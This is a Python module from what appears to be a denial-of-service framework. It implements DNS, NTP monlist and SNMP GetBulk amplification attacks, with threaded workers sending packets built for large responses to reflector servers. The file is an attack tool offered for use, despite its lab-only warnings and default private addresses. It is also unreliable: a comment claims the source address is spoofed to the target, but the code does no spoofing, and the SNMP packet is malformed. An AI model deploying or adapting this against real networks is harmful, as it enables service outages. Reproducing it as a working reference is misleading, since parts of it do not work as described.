#!/usr/bin/env python3
"""
DoS Master Framework - Amplification Attack Module
DNS, NTP, and SNMP amplification attacks (local servers only)
"""

import socket
import threading
import time
import struct
import random
from typing import Dict, Any, List
from datetime import datetime

class AmplificationAttack:
    """Amplification attack using DNS, NTP, and SNMP protocols"""
    
    def __init__(self, config: Dict, logger):
        self.config = config
        self.logger = logger
        self.target = config['target']
        self.protocols = config.get('protocols', ['dns'])
        self.duration = config.get('duration', 60)
        self.threads = config.get('threads', 5)
        self.amplification_servers = config.get('amplification_servers', {})
        self.dry_run = config.get('dry_run', False)
        
        self.packets_sent = 0
        self.attack_active = False
        self.start_time = None
        self.worker_threads = []
        
        # Default local servers (for lab testing only)
        self.default_servers = {
            'dns': ['10.0.0.53'],
            'ntp': ['10.0.0.123'],
            'snmp': ['10.0.0.161']
        }
        
    def validate_config(self) -> bool:
        """Validate attack configuration"""
        try:
            socket.inet_aton(self.target)
            
            valid_protocols = ['dns', 'ntp', 'snmp']
            for protocol in self.protocols:
                if protocol not in valid_protocols:
                    self.logger.error(f"Invalid protocol: {protocol}")
                    return False
            
            if self.duration <= 0 or self.duration > 3600:
                self.logger.error("Duration must be between 1 and 3600 seconds")
                return False
                
            if self.threads <= 0 or self.threads > 50:
                self.logger.error("Threads must be between 1 and 50")
                return False
            
            return True
            
        except socket.error:
            self.logger.error(f"Invalid target IP address: {self.target}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """Execute amplification attack"""
        self.logger.info(f"Starting amplification attack against {self.target}")
        self.logger.warning("Using LOCAL amplification servers only - never test against public servers")
        
        if self.dry_run:
            return self._simulate_attack()
        
        self.attack_active = True
        self.start_time = time.time()
        
        try:
            # Start worker threads for each protocol
            for protocol in self.protocols:
                for i in range(self.threads):
                    thread = threading.Thread(target=self._amplification_worker, args=(protocol, i))
                    thread.start()
                    self.worker_threads.append(thread)
                    time.sleep(0.1)
            
            # Monitor attack progress
            self._monitor_attack()
            
            # Wait for all threads to complete
            for thread in self.worker_threads:
                thread.join()
            
            # Calculate results
            end_time = time.time()
            actual_duration = end_time - self.start_time
            avg_rate = self.packets_sent / actual_duration if actual_duration > 0 else 0
            
            result = {
                'attack_type': 'amplification',
                'target': self.target,
                'protocols': self.protocols,
                'duration': actual_duration,
                'packets_sent': self.packets_sent,
                'avg_rate': avg_rate,
                'threads_used': len(self.worker_threads),
                'amplification_servers': self.amplification_servers or self.default_servers,
                'timestamp': datetime.now().isoformat()
            }
            
            self.logger.info(f"Amplification attack completed: {self.packets_sent} packets sent")
            return result
            
        except Exception as e:
            self.logger.error(f"Amplification attack failed: {e}")
            raise
        finally:
            self.attack_active = False
    
    def _amplification_worker(self, protocol: str, worker_id: int):
        """Amplification worker for specific protocol"""
        self.logger.debug(f"{protocol.upper()} amplification worker {worker_id} started")
        
        # Get servers for this protocol
        servers = self.amplification_servers.get(protocol, self.default_servers.get(protocol, []))
        
        if not servers:
            self.logger.warning(f"No {protocol} servers configured")
            return
        
        local_packets_sent = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.attack_active and (time.time() - self.start_time) < self.duration:
                try:
                    # Select random server
                    server = random.choice(servers)
                    
                    # Create amplification packet based on protocol
                    if protocol == 'dns':
                        packet = self._create_dns_packet()
                        port = 53
                    elif protocol == 'ntp':
                        packet = self._create_ntp_packet()
                        port = 123
                    elif protocol == 'snmp':
                        packet = self._create_snmp_packet()
                        port = 161
                    else:
                        continue
                    
                    # Send packet with spoofed source (target IP)
                    # Note: This only works in isolated lab environments
                    sock.sendto(packet, (server, port))
                    local_packets_sent += 1
                    
                    # Control rate to prevent overwhelming lab servers
                    time.sleep(0.1)
                    
                except Exception as e:
                    self.logger.debug(f"{protocol} worker {worker_id} packet failed: {e}")
                    time.sleep(1)
            
            sock.close()
            self.packets_sent += local_packets_sent
            
        except Exception as e:
            self.logger.error(f"{protocol} amplification worker {worker_id} failed: {e}")
            
        self.logger.debug(f"{protocol} amplification worker {worker_id} completed: {local_packets_sent} packets")
    
    def _create_dns_packet(self) -> bytes:
        """Create DNS query packet for amplification"""
        # DNS header
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answers = 0
        authority = 0
        additional = 0
        
        header = struct.pack('>HHHHHH', transaction_id, flags, questions, answers, authority, additional)
        
        # DNS question for large response
        query_name = b'\x03big\x08testzone\x05local\x00'  # big.testzone.local
        query_type = struct.pack('>HH', 16, 1)  # TXT record, IN class
        
        return header + query_name + query_type
    
    def _create_ntp_packet(self) -> bytes:
        """Create NTP monlist packet for amplification"""
        # NTP packet for monlist query (mode 7, request code 42)
        # Note: monlist is deprecated but used for demonstration
        ntp_packet = struct.pack('!B', 0x17)  # LI=0, VN=2, Mode=7
        ntp_packet += struct.pack('!B', 42)    # Request code (monlist)
        ntp_packet += b'\x00' * 6             # Padding
        
        return ntp_packet
    
    def _create_snmp_packet(self) -> bytes:
        """Create SNMP GetBulk packet for amplification"""
        # Simple SNMP GetBulk request
        # This is a simplified implementation for demonstration
        
        # SNMP version 2c
        version = b'\x02\x01\x01'  # INTEGER: 1 (version 2c)
        
        # Community string "public"
        community = b'\x04\x06public'
        
        # PDU (GetBulk request)
        request_id = struct.pack('>I', random.randint(0, 2**32-1))
        pdu_type = b'\xa5'  # GetBulk request
        
        # Simplified SNMP packet structure
        snmp_packet = version + community + pdu_type + request_id + b'\x00' * 20
        
        return snmp_packet
    
    def _monitor_attack(self):
        """Monitor attack progress"""
        while self.attack_active:
            elapsed = time.time() - self.start_time if self.start_time else 0
            remaining = max(0, self.duration - elapsed)
            
            if elapsed > 0:
                current_rate = self.packets_sent / elapsed
                self.logger.info(f"Amplification attack progress: {elapsed:.1f}s elapsed, "
                               f"{self.packets_sent} packets sent, "
                               f"{current_rate:.1f} pps, "
                               f"{remaining:.1f}s remaining")
            
            if remaining <= 0:
                self.attack_active = False
                break
                
            time.sleep(5)
    
    def _simulate_attack(self) -> Dict[str, Any]:
        """Simulate attack for dry-run mode"""
        self.logger.info("Simulating amplification attack (dry-run mode)")
        
        estimated_packets = len(self.protocols) * self.threads * 100 * self.duration
        time.sleep(2)
        
        return {
            'attack_type': 'amplification',
            'target': self.target,
            'protocols': self.protocols,
            'duration': self.duration,
            'packets_sent': estimated_packets,
            'avg_rate': estimated_packets / self.duration,
            'threads_used': len(self.protocols) * self.threads,
            'amplification_servers': self.amplification_servers or self.default_servers,
            'timestamp': datetime.now().isoformat(),
            'dry_run': True
        }
    
    def stop(self):
        """Stop the attack"""
        self.logger.info("Stopping amplification attack")
        self.attack_active = False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
        
        return {
            'attack_type': 'amplification',
            'active': self.attack_active,
            'elapsed_time': elapsed,
            'packets_sent': self.packets_sent,
            'current_rate': current_rate,
            'protocols': self.protocols,
            'threads_active': len([t for t in self.worker_threads if t.is_alive()])
        }